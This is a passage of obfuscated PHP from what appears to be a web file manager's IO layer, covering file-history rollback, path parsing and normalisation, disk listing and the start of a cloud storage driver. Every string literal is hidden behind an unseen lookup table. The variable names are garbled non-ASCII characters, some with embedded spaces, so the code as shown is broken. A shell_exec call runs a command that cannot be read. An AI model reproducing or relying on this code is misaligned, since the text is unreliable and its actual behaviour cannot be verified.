rollback($Ç¶… ², $³¡ÁéõÕ) { $áÆ‘š”æ =& $_SERVER[–Ú¬çÁ]; $’ğšÁ™µ = self::listData($Ç¶… ²); if (!$’ğšÁ™µ) { return; } $»İÅÄ½ = IO::info($Ç¶… ²); foreach ($’ğšÁ™µ[$áÆ‘š”æ[422]] as $§âğÍéÂ => $–ê˜ÑÉÏ) { if ($–ê˜ÑÉÏ[$áÆ‘š”æ[452]] == $³¡ÁéõÕ) { self::add($Ç¶… ²); $‘çˆì¹œ = $’ğšÁ™µ[$áÆ‘š”æ[1263]] . $–ê˜ÑÉÏ[$áÆ‘š”æ[32]]; $½á¹øÆ… = IO::copy($‘çˆì¹œ, IO::pathFather($Ç¶… ²), REPEAT_REPLACE, $»İÅÄ½[$áÆ‘š”æ[32]]); if ($½á¹øÆ…) { self::remove($Ç¶… ², $³¡ÁéõÕ); } return $½á¹øÆ…; } } return !1; } public static function setDetail($ºëÙÒã†, $‡À¥¯ıÒ, $ıÚ»×Ù) { $¹øËÈ‘ =& $_SERVER[–Ú¬çÁ]; $„Åúşõ§ = self::listData($ºëÙÒã†); if (!$„Åúşõ§) { return; } foreach ($„Åúşõ§[$¹øËÈ‘[422]] as $üÂ¹¼ÙŒ => $ãƒË‰˜) { if ($ãƒË‰˜[$¹øËÈ‘[452]] == $‡À¥¯ıÒ) { $„Åúşõ§[$¹øËÈ‘[422]][$üÂ¹¼ÙŒ][$¹øËÈ‘[1262]] = $ıÚ»×Ù; self::saveData($„Åúşõ§[$¹øËÈ‘[1264]], $„Åúşõ§[$¹øËÈ‘[422]]); return !0; } } return !1; } public static function fileInfo($Â´º¶¿, $Œ¨êµ Æ) { $úÃÎ•¿Ÿ =& $_SERVER[–Ú¬çÁ]; $­˜÷•½Ø = self::listData($Â´º¶¿); if (!$­˜÷•½Ø) { show_json(LNG($úÃÎ•¿Ÿ[105]), !1); } $è–Ë£± = $úÃÎ•¿Ÿ[12]; foreach ($­˜÷•½Ø[$úÃÎ•¿Ÿ[422]] as $‰Ìõ‘°– => $¥ŠœÃÑ„) { if ($¥ŠœÃÑ„[$úÃÎ•¿Ÿ[452]] != $Œ¨êµ Æ) { continue; } $è–Ë£± = $­˜÷•½Ø[$úÃÎ•¿Ÿ[1263]] . $¥ŠœÃÑ„[$úÃÎ•¿Ÿ[32]]; break; } if (!$è–Ë£±) { show_json(LNG($úÃÎ•¿Ÿ[105]), !1); } return IO::info($è–Ë£±); } public static function fileOut($¥ ÊÌ, $Û€şÈúµ, $½àÑÈ£ = false) { $ĞÊŠ˜´ =& $_SERVER[–Ú¬çÁ]; $ğ…Œ„º¹ = self::fileInfo($¥ ÊÌ, $Û€şÈúµ); $äÉ’ÁÉ =& $GLOBALS[$ĞÊŠ˜´[7]]; $½àÑÈ£ = isset($äÉ’ÁÉ[$ĞÊŠ˜´[1214]]) && $äÉ’ÁÉ[$ĞÊŠ˜´[1214]] == 1; if (isset($äÉ’ÁÉ[$ĞÊŠ˜´[33]]) && $äÉ’ÁÉ[$ĞÊŠ˜´[33]] == $ĞÊŠ˜´[1265]) { return IO::fileOutImage($ğ…Œ„º¹[$ĞÊŠ˜´[84]], $äÉ’ÁÉ[$ĞÊŠ˜´[1266]]); } IO::fileOut($ğ…Œ„º¹[$ĞÊŠ˜´[84]], $½àÑÈ£, get_path_this($¥ ÊÌ)); } public static function listData($ÕöÑá€·, $Ä›–Ë´Ÿ = true) { $Ê·ôíÃı =& $_SERVER[–Ú¬çÁ]; if ($Ä›–Ë´Ÿ && !IO::exist($ÕöÑá€·)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ÕöÑá€·, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $øÈ”«¸€ = self::pathHistory($ÕöÑá€·); $…Û“´»õ = array($Ê·ôíÃı[1264] => $øÈ”«¸€ . $Ê·ôíÃı[1251], $Ê·ôíÃı[1263] => rtrim(get_path_father($øÈ”«¸€), $Ê·ôíÃı[8]) . $Ê·ôíÃı[8], $Ê·ôíÃı[422] => array()); $ŞÊØ†—ö = IO::getContent($…Û“´»õ[$Ê·ôíÃı[1264]]); if ($ŞÊØ†—ö) { $Êîóùş = json_decode($ŞÊØ†—ö, !0); if (is_array($Êîóùş)) { $…Û“´»õ[$Ê·ôíÃı[422]] = $Êîóùş; } } return $…Û“´»õ; } private static function saveData($­´¯ö×â, $£Ô” æ€) { $ä—ùÛÇ· =& $_SERVER[–Ú¬çÁ]; self::log($ä—ùÛÇ·[1267] . $­´¯ö×â . $ä—ùÛÇ·[71] . count($£Ô” æ€), $ä—ùÛÇ·[771]); if ($£Ô” æ€) { return IO::setContent($­´¯ö×â, json_encode($£Ô” æ€)); } $„øŠÏãœ = IO::pathFather($­´¯ö×â); IO::remove($­´¯ö×â); self::clearEmptyFolder($„øŠÏãœ); return !0; } public static function clearEmptyFolder($ş’½¯) { $§¯Ê¬Üâ =& $_SERVER[–Ú¬çÁ]; if (trim($ş’½¯, $§¯Ê¬Üâ[8]) == trim(self::$_historyBase, $§¯Ê¬Üâ[8])) { return; } $ü»¢¿Ó» = IO::pathFather($ş’½¯); $·Ö´üÁÇ = IO::has($ş’½¯, !0); if ($·Ö´üÁÇ[$§¯Ê¬Üâ[233]] > 0 || $·Ö´üÁÇ[$§¯Ê¬Üâ[234]] > 0) { return; } IO::remove($ş’½¯); self::clearEmptyFolder($ü»¢¿Ó»); } private static function getBasePath() { $•ÌŠ»‚Á =& $_SERVER[–Ú¬çÁ]; $ß·µúÅ = Model($•ÌŠ»‚Á[1268])->get($•ÌŠ»‚Á[1269]); if ($ß·µúÅ) { if (!IO::exist($ß·µúÅ)) { IO::mkdir($ß·µúÅ); } if (get_path_this($ß·µúÅ) == $•ÌŠ»‚Á[1254]) { $Èçûâö¦ = $•ÌŠ»‚Á[1270] . rand_string(8); @rename($ß·µúÅ, get_path_father($ß·µúÅ) . $•ÌŠ»‚Á[8] . $Èçûâö¦); $ß·µúÅ = DATA_PATH . $Èçûâö¦ . $•ÌŠ»‚Á[8]; file_put_contents(DATA_PATH . $•ÌŠ»‚Á[1204], $•ÌŠ»‚Á[12]); Model($•ÌŠ»‚Á[1268])->set($•ÌŠ»‚Á[1269], $ß·µúÅ); } return $ß·µúÅ; } $ß·µúÅ = DATA_PATH . $•ÌŠ»‚Á[1270] . rand_string(8) . $•ÌŠ»‚Á[8]; $ß·µúÅ = IO::mkdir($ß·µúÅ); $ß·µúÅ = rtrim($ß·µúÅ, $•ÌŠ»‚Á[8]) . $•ÌŠ»‚Á[8]; file_put_contents($ß·µúÅ . $•ÌŠ»‚Á[1204], $•ÌŠ»‚Á[12]); file_put_contents(DATA_PATH . $•ÌŠ»‚Á[1204], $•ÌŠ»‚Á[12]); Model($•ÌŠ»‚Á[1268])->set($•ÌŠ»‚Á[1269], $ß·µúÅ); return $ß·µúÅ; } } class KodIO { const KOD_SOURCE = "\173\163\157\x75\x72\x63\145\x7d"; const KOD_USER_RECYCLE = "\x7b\165\x73\145\x72\x52\x65\x63\171\x63\154\x65\175"; const KOD_USER_FAV = "\173\165\163\x65\162\106\141\166\175"; const KOD_USER_FILE_TAG = "\x7b\x75\163\145\162\x46\x69\154\145\x54\141\147\x7d"; const KOD_USER_FILE_TYPE = "\173\165\163\x65\x72\x46\151\154\145\x54\x79\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\157\x75\160\122\157\157\164\x53\145\154\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\163\145\162\123\x68\141\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\145\162\x53\x68\141\x72\x65\114\151\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\141\162\x65\124\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\x68\x61\162\145\x49\164\x65\155\x7d"; const KOD_SHARE_LINK = "\173\163\150\141\x72\x65\x49\164\x65\x6d\114\151\156\153\x7d"; const KOD_SEARCH = "\x7b\163\145\141\x72\143\x68\175"; const KOD_BLOCK = "\173\142\154\x6f\143\153\x7d"; const KOD_IO = "\173\151\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\x73\x65\162\x52\145\156\x63\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\162\x69\x76\x65\162\175"; public static function typeList() { $ßšÂ»» =& $_SERVER[–Ú¬çÁ]; return array($ßšÂ»»[1271] => self::KOD_SOURCE, $ßšÂ»»[1272] => self::KOD_USER_RECYCLE, $ßšÂ»»[1273] => self::KOD_USER_FAV, $ßšÂ»»[1274] => self::KOD_USER_FILE_TAG, $ßšÂ»»[1275] => self::KOD_USER_FILE_TYPE, $ßšÂ»»[1276] => self::KOD_GROUP_ROOT_SELF, $ßšÂ»»[1277] => self::KOD_USER_SHARE, $ßšÂ»»[1278] => self::KOD_USER_SHARE_LINK, $ßšÂ»»[1279] => self::KOD_USER_SHARE_TO_ME, $ßšÂ»»[1280] => self::KOD_SHARE_ITEM, $ßšÂ»»[1281] => self::KOD_SHARE_LINK, $ßšÂ»»[1282] => self::KOD_SEARCH, $ßšÂ»»[1283] => self::KOD_BLOCK, $ßšÂ»»[1284] => self::KOD_IO, $ßšÂ»»[1285] => self::KOD_USER_RECENT, $ßšÂ»»[1286] => self::KOD_USER_DRIVER); } public static function parse($ŒÛ×çô­) { $¥–¬˜ÎÖ =& $_SERVER[–Ú¬çÁ]; $ŒÛ×çô­ = self::clear($ŒÛ×çô­); $´¬‚„õ = array_values(self::typeList()); preg_match($¥–¬˜ÎÖ[1287], $ŒÛ×çô­, $Ëæ÷ù‹ô); $ÁÒµ¾× = array($¥–¬˜ÎÖ[473] => !1, $¥–¬˜ÎÖ[1288] => !1, $¥–¬˜ÎÖ[470] => !1, $¥–¬˜ÎÖ[84] => $ŒÛ×çô­, $¥–¬˜ÎÖ[1189] => !1, $¥–¬˜ÎÖ[1188] => $¥–¬˜ÎÖ[12]); if (is_array($Ëæ÷ù‹ô) && count($Ëæ÷ù‹ô) == 5) { $ºşªß´† = $¥–¬˜ÎÖ[1289] . $Ëæ÷ù‹ô[2] . $¥–¬˜ÎÖ[380]; if (in_array($ºşªß´†, $´¬‚„õ)) { $ÁÒµ¾×[$¥–¬˜ÎÖ[1189]] = $Ëæ÷ù‹ô[1]; $ÁÒµ¾×[$¥–¬˜ÎÖ[33]] = $ºşªß´†; $ÁÒµ¾×[$¥–¬˜ÎÖ[1290]] = substr($ºşªß´†, 1, -1); $ÁÒµ¾×[$¥–¬˜ÎÖ[452]] = $Ëæ÷ù‹ô[3]; } $ÁÒµ¾×[$¥–¬˜ÎÖ[1188]] = $Ëæ÷ù‹ô[4]; } $Ä¨ŸÃ„“ = array($¥–¬˜ÎÖ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ÁÒµ¾×[$¥–¬˜ÎÖ[1253]] = in_array($ÁÒµ¾×[$¥–¬˜ÎÖ[33]], $Ä¨ŸÃ„“); return $ÁÒµ¾×; } public static function isTruePath($–´³Çíï) { $«ÜÂ–äï =& $_SERVER[–Ú¬çÁ]; if (substr($–´³Çíï, 0, 1) != $«ÜÂ–äï[1289]) { return !0; } if (strpos($–´³Çíï, $«ÜÂ–äï[460]) === 0) { return !0; } if (strpos($–´³Çíï, $«ÜÂ–äï[1257]) === 0) { return !0; } if (strpos($–´³Çíï, $«ÜÂ–äï[1291]) === 0) { return !0; } if (strpos($–´³Çíï, $«ÜÂ–äï[1292]) === 0) { return !0; } if (strpos($–´³Çíï, $«ÜÂ–äï[1293]) === 0) { return !0; } return !1; } public static function clear($ïÒ¿Õ×°) { $ƒ»¾íü =& $_SERVER[–Ú¬çÁ]; $ïÒ¿Õ×° = str_replace(array($ƒ»¾íü[1098], $ƒ»¾íü[206]), $ƒ»¾íü[53], $ïÒ¿Õ×°); $ïÒ¿Õ×° = str_replace($ƒ»¾íü[97], $ƒ»¾íü[8], $ïÒ¿Õ×°); $‡ÄäúÆ = $ƒ»¾íü[1294]; if (substr($ïÒ¿Õ×°, 0, 3) == $ƒ»¾íü[1295]) { $ïÒ¿Õ×° = substr($ïÒ¿Õ×°, 3); } while (strstr($ïÒ¿Õ×°, $‡ÄäúÆ)) { $ïÒ¿Õ×° = str_replace($‡ÄäúÆ, $ƒ»¾íü[8], $ïÒ¿Õ×°); } $ïÒ¿Õ×° = preg_replace($ƒ»¾íü[1296], $ƒ»¾íü[8], $ïÒ¿Õ×°); if ($ïÒ¿Õ×° == $ƒ»¾íü[8]) { return $ƒ»¾íü[8]; } $ïÒ¿Õ×° = rtrim($ïÒ¿Õ×°, $ƒ»¾íü[8]); return $ïÒ¿Õ×°; } public static function pathTrue($ıĞ‡™š ) { $Ìèª¯•Ú =& $_SERVER[–Ú¬çÁ]; if (!$ıĞ‡™š ) { return $Ìèª¯•Ú[12]; } $ıĞ‡™š  = str_replace($Ìèª¯•Ú[571], $Ìèª¯•Ú[8], str_replace($Ìèª¯•Ú[1297], $Ìèª¯•Ú[8], $ıĞ‡™š )); $ıĞ‡™š  = str_replace($Ìèª¯•Ú[571], $Ìèª¯•Ú[8], str_replace($Ìèª¯•Ú[1297], $Ìèª¯•Ú[8], $ıĞ‡™š )); if (!strstr($ıĞ‡™š , $Ìèª¯•Ú[1295])) { return $ıĞ‡™š ; } $¦Şœ¹¤¬ = explode($Ìèª¯•Ú[8], $ıĞ‡™š ); foreach ($¦Şœ¹¤¬ as $ÉñÃæ€ë => $ñà€€à) { if ($ñà€€à !== $Ìèª¯•Ú[1298]) { continue; } for ($“”Ã±Ä‰ = $ÉñÃæ€ë; $“”Ã±Ä‰ >= 0; $“”Ã±Ä‰--) { if ($¦Şœ¹¤¬[$“”Ã±Ä‰] === $Ìèª¯•Ú[10] || $¦Şœ¹¤¬[$“”Ã±Ä‰] === $Ìèª¯•Ú[1298] || $¦Şœ¹¤¬[$“”Ã±Ä‰] === -1) { continue; } if ($¦Şœ¹¤¬[$“”Ã±Ä‰] === $Ìèª¯•Ú[12]) { $¦Şœ¹¤¬[$ÉñÃæ€ë] = -1; break; } $¦Şœ¹¤¬[$ÉñÃæ€ë] = -1; $¦Şœ¹¤¬[$“”Ã±Ä‰] = -1; break; } } $Â€ğ±Ğ = array(); foreach ($¦Şœ¹¤¬ as $ñà€€à) { if ($ñà€€à !== -1) { $Â€ğ±Ğ[] = $ñà€€à; } } $¬‡¥š›› = implode($Ìèª¯•Ú[8], $Â€ğ±Ğ); if (strpos($¬‡¥š››, $Ìèª¯•Ú[1299]) === 0) { $¬‡¥š›› = $Ìèª¯•Ú[1295] . substr($¬‡¥š››, strlen($Ìèª¯•Ú[1299])); } return $¬‡¥š››; } public static function sourceID($ï–¼ÛÚ) { $šãñûÂ¹ =& $_SERVER[–Ú¬çÁ]; $¨Ô­Æø = self::parse($ï–¼ÛÚ); if ($¨Ô­Æø[$šãñûÂ¹[33]] !== self::KOD_SOURCE) { show_json(LNG($šãñûÂ¹[1300]), !1); } return $¨Ô­Æø[$šãñûÂ¹[452]]; } public static function make($…İ‘‘¤Æ) { if (!$…İ‘‘¤Æ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($…İ‘‘¤Æ)); } public static function makeShare($‡ñÓİï™, $­ªÌãĞ¶) { return self::makePath(self::KOD_SHARE_ITEM, $‡ñÓİï™, $­ªÌãĞ¶); } public static function makeFileTypePath($ûšğ£ôØ) { return self::makePath(self::KOD_USER_FILE_TYPE, $ûšğ£ôØ); } public static function makeFileTagPath($èÜ­£Š¹) { return self::makePath(self::KOD_USER_FILE_TAG, $èÜ­£Š¹); } public static function makePath($µâÖÅ¸, $ŒÃÉİüƒ = '', $ğ„•“Å° = '') { $„¥šÆ =& $_SERVER[–Ú¬çÁ]; $ë„††° = substr($µâÖÅ¸, 1, -1); $Â„âÒ Ò = $„¥šÆ[1301] . $ë„††° . $„¥šÆ[1302] . $ŒÃÉİüƒ . $„¥šÆ[1303]; $Â„âÒ Ò = $ğ„•“Å° ? $Â„âÒ Ò . $ğ„•“Å° . $„¥šÆ[8] : $Â„âÒ Ò; return $Â„âÒ Ò; } public static function hashPath($¤½öªµá, $Ïœ½úÂÒ = true) { $‹Ë¢´ü‘ =& $_SERVER[–Ú¬çÁ]; $ØçÈğßÆ = is_array($¤½öªµá) ? $¤½öªµá : IO::info($¤½öªµá); $Å¼îô´À = _get($ØçÈğßÆ, $‹Ë¢´ü‘[1304], $‹Ë¢´ü‘[12]); if (!$Å¼îô´À && isset($ØçÈğßÆ[$‹Ë¢´ü‘[229]])) { $Å¼îô´À = trim($ØçÈğßÆ[$‹Ë¢´ü‘[229]], $‹Ë¢´ü‘[118]); } if (!$Å¼îô´À && isset($ØçÈğßÆ[$‹Ë¢´ü‘[181]]) && $ØçÈğßÆ[$‹Ë¢´ü‘[181]]) { $ØçÈğßÆ = IO::info(KodIO::make($ØçÈğßÆ[$‹Ë¢´ü‘[181]])); $Å¼îô´À = _get($ØçÈğßÆ, $‹Ë¢´ü‘[1304], $‹Ë¢´ü‘[12]); } $äüß™½· = md5($ØçÈğßÆ[$‹Ë¢´ü‘[84]] . $ØçÈğßÆ[$‹Ë¢´ü‘[76]] . $ØçÈğßÆ[$‹Ë¢´ü‘[85]]); if (!$Å¼îô´À && file_exists($ØçÈğßÆ[$‹Ë¢´ü‘[84]])) { $Å¼îô´À = Cache::get($äüß™½· . $‹Ë¢´ü‘[1305]); $Å¼îô´À = !1; if (!$Å¼îô´À) { $Å¼îô´À = IO::hashSimple($ØçÈğßÆ[$‹Ë¢´ü‘[84]]); Cache::set($äüß™½· . $‹Ë¢´ü‘[1305], $Å¼îô´À, 3600 * 24 * 30); } } if ($Ïœ½úÂÒ && !$Å¼îô´À) { } return $Å¼îô´À ? $Å¼îô´À : $äüß™½·; } public static function hashPathSafe($âöî²…´, $¯Ğ½¡Ï = true) { $šı¼Ï® =& $_SERVER[–Ú¬çÁ]; $ÏÛ·›Ô² = self::hashPath($âöî²…´, $¯Ğ½¡Ï); return md5($ÏÛ·›Ô² . $šı¼Ï®[1306] . Model($šı¼Ï®[790])->get($šı¼Ï®[791])); } public static function initSystemPath() { $ï©İî¿ =& $_SERVER[–Ú¬çÁ]; if (defined($ï©İî¿[1307])) { return; } define($ï©İî¿[1307], self::systemPath($ï©İî¿[179])); define($ï©İî¿[1308], self::systemPath($ï©İî¿[1309])); define($ï©İî¿[1310], self::systemPath($ï©İî¿[1311])); define($ï©İî¿[1312], self::systemPath($ï©İî¿[1313])); IOHistory::bindEvent(); } public static function systemPath($†ÕÚ‘°€) { $»—»ÃëÜ =& $_SERVER[–Ú¬çÁ]; $£¿‹ËÆø = $»—»ÃëÜ[1314] . ucfirst($†ÕÚ‘°€); $‹Í£ñ•„ = Model($»—»ÃëÜ[790])->get($£¿‹ËÆø); if ($‹Í£ñ•„) { return $‹Í£ñ•„; } if ($†ÕÚ‘°€ == $»—»ÃëÜ[179]) { $‹Í£ñ•„ = self::make(Model($»—»ÃëÜ[845])->systemRootPathAdd($»—»ÃëÜ[584])); } else { $‹Í£ñ•„ = self::systemPath($»—»ÃëÜ[179]); $™º­ë‡¦ = self::sourceID($‹Í£ñ•„); $‹Í£ñ•„ = self::make(Model($»—»ÃëÜ[845])->mkdir($™º­ë‡¦, $†ÕÚ‘°€)); } Model($»—»ÃëÜ[790])->set($£¿‹ËÆø, $‹Í£ñ•„); return $‹Í£ñ•„; } public static function systemFolder($ÏŞöû°ö) { $ŠóÜ¿àö = IO_PATH_SYSTEM_SOURCE . $ÏŞöû°ö; $ÙÛ„Üªø = Cache::get($ŠóÜ¿àö); if (!$ÙÛ„Üªø) { $ÎÓúÉöĞ = IO::infoFullSimple($ŠóÜ¿àö); if (!$ÎÓúÉöĞ) { $ÙÛ„Üªø = IO::mkdir($ŠóÜ¿àö, REPEAT_SKIP); } else { $ÙÛ„Üªø = $ÎÓúÉöĞ[$_SERVER[–Ú¬çÁ][84]]; } Cache::set($ŠóÜ¿àö, $ÙÛ„Üªø, 3600 * 10); } return $ÙÛ„Üªø; } public static function defaultDriver() { return Model($_SERVER[–Ú¬çÁ][787])->defaultDriver(); } public static function defaultIO() { $´ìì’ç =& $_SERVER[–Ú¬çÁ]; $¦ÉÙ¿Ì’ = self::defaultDriver(); return $´ìì’ç[1315] . $¦ÉÙ¿Ì’[$´ìì’ç[452]] . $´ìì’ç[1303]; } public static function defaultDriverInit() { static $é›”Ù¦Ô = false; if ($é›”Ù¦Ô) { return $é›”Ù¦Ô; } $é›”Ù¦Ô = IO::init(self::defaultIO()); return $é›”Ù¦Ô; } public static function fileTypeList() { $Ô‰ÛâŠ  =& $_SERVER[–Ú¬çÁ]; $ÙúÆ²”Ù = $GLOBALS[$Ô‰ÛâŠ [6]][$Ô‰ÛâŠ [1316]]; foreach ($ÙúÆ²”Ù as $Øèó¿î => $ü¦­¦Îí) { $ó›š°Ğ = $Ô‰ÛâŠ [1317] . $Øèó¿î; $½¯Îâøœ = LNG($ó›š°Ğ); if ($ó›š°Ğ != $½¯Îâøœ) { $ÙúÆ²”Ù[$Øèó¿î][$Ô‰ÛâŠ [32]] = $½¯Îâøœ; } } return $ÙúÆ²”Ù; } public static function diskList($ÚÀı»Ÿ³ = true) { $ËÎĞâÜÎ = $_SERVER[–Ú¬çÁ][1318]; if ($ÚÀı»Ÿ³) { $üæÇÌá€ = Cache::get($ËÎĞâÜÎ); if (is_array($üæÇÌá€)) { return $üæÇÌá€; } } $üæÇÌá€ = self::diskListGet(); Cache::set($ËÎĞâÜÎ, $üæÇÌá€, 60); return $üæÇÌá€; } public static function diskListGet() { $‚“•Òü¾ =& $_SERVER[–Ú¬çÁ]; $›Ô§üÍ³ = array(); if ($GLOBALS[$‚“•Òü¾[6]][$‚“•Òü¾[1319]] == $‚“•Òü¾[1320]) { $§ïûÁö× = $‚“•Òü¾[1321]; for ($ œåµ¢§ = 0; $ œåµ¢§ < strlen($§ïûÁö×); $ œåµ¢§++) { $ëı¾‹âˆ = $§ïûÁö×[$ œåµ¢§] . $‚“•Òü¾[1322]; if (file_exists($ëı¾‹âˆ)) { $›Ô§üÍ³[] = $ëı¾‹âˆ; } } return $›Ô§üÍ³; } if (!function_exists($‚“•Òü¾[98])) { $›Ô§üÍ³[] = $‚“•Òü¾[856]; return $›Ô§üÍ³; } $üŞÛÛÂŞ = explode($‚“•Òü¾[206], shell_exec($‚“•Òü¾[1323])); array_shift($üŞÛÛÂŞ); array_pop($üŞÛÛÂŞ); $Æ«ØÅé = array($‚“•Òü¾[1324], $‚“•Òü¾[1325], $‚“•Òü¾[1326], $‚“•Òü¾[1327], $‚“•Òü¾[1328], $‚“•Òü¾[1329], $‚“•Òü¾[1330], $‚“•Òü¾[1331]); foreach ($üŞÛÛÂŞ as $úÉ¸Ï·ä) { $³Ä’ê³” = preg_split($‚“•Òü¾[1332], $úÉ¸Ï·ä); $ëı¾‹âˆ = $³Ä’ê³”[count($³Ä’ê³”) - 1]; if (!strstr($³Ä’ê³”[0], $‚“•Òü¾[1333]) || !$ëı¾‹âˆ) { continue; } $×Öú¯Ä = rtrim($ëı¾‹âˆ, $‚“•Òü¾[8]) . $‚“•Òü¾[8]; if (in_array($×Öú¯Ä, $Æ«ØÅé)) { continue; } $›Ô§üÍ³[] = $×Öú¯Ä; } return $›Ô§üÍ³; } public static function isSameDisk($»ÎÚŸÁ, $¶œ¡€¯ò) { $±É¡æ›À =& $_SERVER[–Ú¬çÁ]; if ($GLOBALS[$±É¡æ›À[6]][$±É¡æ›À[1319]] == $±É¡æ›À[1320]) { return strtolower(substr($»ÎÚŸÁ, 0, 1)) == strtolower(substr($¶œ¡€¯ò, 0, 1)); } $ç‡×ŒÑÄ = self::diskList(); $Ç©Ûœãß = !1; $½”ôÁ’– = !1; sort($ç‡×ŒÑÄ); $ç‡×ŒÑÄ = array_reverse($ç‡×ŒÑÄ); $»ÎÚŸÁ = rtrim($»ÎÚŸÁ, $±É¡æ›À[8]) . $±É¡æ›À[8]; $¶œ¡€¯ò = rtrim($¶œ¡€¯ò, $±É¡æ›À[8]) . $±É¡æ›À[8]; foreach ($ç‡×ŒÑÄ as $å¸ñ¥×ß) { $ƒêöÎò = strlen($å¸ñ¥×ß); if (!$Ç©Ûœãß && substr($»ÎÚŸÁ, 0, $ƒêöÎò) == $å¸ñ¥×ß) { $Ç©Ûœãß = $å¸ñ¥×ß; } if (!$½”ôÁ’– && substr($¶œ¡€¯ò, 0, $ƒêöÎò) == $å¸ñ¥×ß) { $½”ôÁ’– = $å¸ñ¥×ß; } if ($Ç©Ûœãß && $½”ôÁ’–) { break; } } return $Ç©Ûœãß === $½”ôÁ’–; } public static function transferType($µï£ÅŠ, $ÁÖ·ìÓß) { $¤¯˜õ =& $_SERVER[–Ú¬çÁ]; $‚×£ØêÒ = self::driverType($µï£ÅŠ); $²Ç‰›Ö½ = self::driverType($ÁÖ·ìÓß); if ($‚×£ØêÒ[$¤¯˜õ[33]] == $²Ç‰›Ö½[$¤¯˜õ[33]] && $‚×£ØêÒ[$¤¯˜õ[1334]] == $²Ç‰›Ö½[$¤¯˜õ[1334]]) { return $¤¯˜õ[1335]; } if ($‚×£ØêÒ[$¤¯˜õ[33]] == $¤¯˜õ[889] && $²Ç‰›Ö½[$¤¯˜õ[33]] == $¤¯˜õ[106]) { return $¤¯˜õ[1214]; } if ($‚×£ØêÒ[$¤¯˜õ[33]] == $¤¯˜õ[106] && $²Ç‰›Ö½[$¤¯˜õ[33]] == $¤¯˜õ[889]) { return $¤¯˜õ[107]; } return $¤¯˜õ[1336]; } public static function driverType($ØƒÂ¿™—) { $”ı‰Ôğ˜ =& $_SERVER[–Ú¬çÁ]; $•‘Õ¥Ÿ… = str_replace($”ı‰Ôğ˜[1337], $”ı‰Ôğ˜[12], strtolower($ØƒÂ¿™—->getType())); if ($•‘Õ¥Ÿ… == $”ı‰Ôğ˜[777] || $•‘Õ¥Ÿ… == $”ı‰Ôğ˜[1338] || $•‘Õ¥Ÿ… == $”ı‰Ôğ˜[1339]) { $ØƒÂ¿™— = self::defaultDriverInit(); } else { if ($•‘Õ¥Ÿ… == $”ı‰Ôğ˜[1224] || $•‘Õ¥Ÿ… == $”ı‰Ôğ˜[1340]) { $ØƒÂ¿™— = IO::init($ØƒÂ¿™—->pathParse[$”ı‰Ôğ˜[1171]]); } } $êÒ§½éã = $ØƒÂ¿™—->path; $•‘Õ¥Ÿ… = str_replace($”ı‰Ôğ˜[1337], $”ı‰Ôğ˜[12], strtolower($ØƒÂ¿™—->getType())); if ($•‘Õ¥Ÿ… == $”ı‰Ôğ˜[106]) { return array($”ı‰Ôğ˜[33] => $”ı‰Ôğ˜[106], $”ı‰Ôğ˜[1334] => $”ı‰Ôğ˜[12], $”ı‰Ôğ˜[84] => $êÒ§½éã, $”ı‰Ôğ˜[95] => $ØƒÂ¿™—); } return array($”ı‰Ôğ˜[33] => $”ı‰Ôğ˜[889], $”ı‰Ôğ˜[1334] => $ØƒÂ¿™—->pathDriver, $”ı‰Ôğ˜[84] => $êÒ§½éã, $”ı‰Ôğ˜[95] => $ØƒÂ¿™—); } public static function pathDriverType($â§·Ôæš) { return $â§·Ôæš ? self::driverType(IO::init($â§·Ôæš)) : !1; } public static function pathDriverLocal($İçó›Šï) { $÷¶¯ßŞ =& $_SERVER[–Ú¬çÁ]; $Î×«Õ¨¬ = $İçó›Šï ? self::driverType(IO::init($İçó›Šï)) : !1; return $Î×«Õ¨¬[$÷¶¯ßŞ[33]] == $÷¶¯ßŞ[106] ? !0 : !1; } public static function allowCover($Î±Ş©Êš, $¥£éÏ•İ = true) { $À«Ğ‚® =& $_SERVER[–Ú¬çÁ]; if (is_string($Î±Ş©Êš)) { $Î±Ş©Êš = IO::info($Î±Ş©Êš); } if (!$Î±Ş©Êš || $Î±Ş©Êš[$À«Ğ‚®[33]] == $À«Ğ‚®[75] || $Î±Ş©Êš[$À«Ğ‚®[76]] <= 100) { return !1; } if (isset($Î±Ş©Êš[$À«Ğ‚®[1341]]) || !$Î±Ş©Êš[$À«Ğ‚®[84]]) { return !1; } if (isset($Î±Ş©Êš[$À«Ğ‚®[226]]) && !$Î±Ş©Êš[$À«Ğ‚®[226]]) { return !1; } static $ÅœÊÛş’ = false; if (!$ÅœÊÛş’ || !$¥£éÏ•İ) { $áÄŞŞêŒ = self::driverType(IO::init($Î±Ş©Êš[$À«Ğ‚®[84]])); $¢€âîÄš = $áÄŞŞêŒ[$À«Ğ‚®[95]]; $ÅœÊÛş’ = $À«Ğ‚®[184]; if ($áÄŞŞêŒ[$À«Ğ‚®[33]] == $À«Ğ‚®[106]) { $ÅœÊÛş’ = $À«Ğ‚®[1342]; } if ($áÄŞŞêŒ[$À«Ğ‚®[95]] && is_array($áÄŞŞêŒ[$À«Ğ‚®[95]]->config)) { $İÃÍê‚á = $áÄŞŞêŒ[$À«Ğ‚®[95]]->config; if (isset($İÃÍê‚á[$À«Ğ‚®[1343]]) && $İÃÍê‚á[$À«Ğ‚®[1343]]) { $ÅœÊÛş’ = $À«Ğ‚®[1342]; } } } return $ÅœÊÛş’ == $À«Ğ‚®[1342] ? !0 : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($¼—¢ÆÁ­) { parent::__construct($¼—¢ÆÁ­); $this->signatureVersion($_SERVER[–Ú¬çÁ][241]); } public function uploadFormData($ƒÃİß¡Ó, $Å¿°ˆ† = 3600) { $ÁÖ™¥Ï =& $_SERVER[–Ú¬çÁ]; $İÍÓ‘Ó = $ÁÖ™¥Ï[223]; $¡œõŠ¾ = $ÁÖ™¥Ï[256]; $”£ƒ“ğ² = 